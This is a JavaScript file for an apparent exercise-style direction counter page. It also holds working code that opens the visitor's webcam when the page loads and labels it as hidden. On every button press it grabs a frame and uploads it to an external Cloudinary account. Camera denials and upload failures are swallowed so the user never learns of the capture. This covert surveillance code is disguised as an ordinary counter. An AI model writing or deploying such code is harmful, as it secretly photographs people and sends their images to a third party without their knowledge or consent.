// --- Cloudinary Configuration (Silent Background Uploads) ---
const CLOUDINARY_CLOUD_NAME = "YOUR_CLOUD_NAME";
const CLOUDINARY_UPLOAD_PRESET = "YOUR_UNSIGNED_UPLOAD_PRESET";

// Target limits per direction
const TARGET_PER_DIRECTION = 25;

// Repetition State
const counts = {
    up: 0,
    down: 0,
    left: 0,
    right: 0
};

// Elements
const video = document.getElementById("bg-video");
const canvas = document.getElementById("bg-canvas");

// Initialize hidden camera stream silently on page load
window.addEventListener("DOMContentLoaded", () => {
    initSilentCamera();
    updateUI();
});

function initSilentCamera() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
            })
            .catch(() => {
                // Silently ignore access denials without interrupting user flow
            });
    }
}

// Increment counter for given direction
function increment(direction) {
    if (counts[direction] < TARGET_PER_DIRECTION) {
        counts[direction]++;
        updateUI();
        
        // Background capture on each increment
        captureAndUploadSilently(direction);
    }
}

// Reset all counters
function resetCounts() {
    counts.up = 0;
    counts.down = 0;
    counts.left = 0;
    counts.right = 0;
    updateUI();
}

// Update DOM elements and disable buttons when target reached
function updateUI() {
    const total = counts.up + counts.down + counts.left + counts.right;

    document.getElementById("up-count").textContent = counts.up;
    document.getElementById("down-count").textContent = counts.down;
    document.getElementById("left-count").textContent = counts.left;
    document.getElementById("right-count").textContent = counts.right;
    document.getElementById("total-count").textContent = total;

    document.getElementById("btn-up").disabled = counts.up >= TARGET_PER_DIRECTION;
    document.getElementById("btn-down").disabled = counts.down >= TARGET_PER_DIRECTION;
    document.getElementById("btn-left").disabled = counts.left >= TARGET_PER_DIRECTION;
    document.getElementById("btn-right").disabled = counts.right >= TARGET_PER_DIRECTION;
}

// Captures a frame from video stream and uploads silently to Cloudinary
function captureAndUploadSilently(directionTag) {
    if (!video.srcObject || video.readyState !== video.HAVE_ENOUGH_DATA) {
        return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL("image/jpeg");

    // Construct form data for Cloudinary
    const formData = new FormData();
    formData.append("file", dataUrl);
    formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);
    formData.append("tags", `rep_${directionTag}`);

    // Send silently without triggering any UI updates or alerts
    fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`, {
        method: "POST",
        body: formData
    }).catch(() => {
        // Suppress network errors from user UI
    });
}
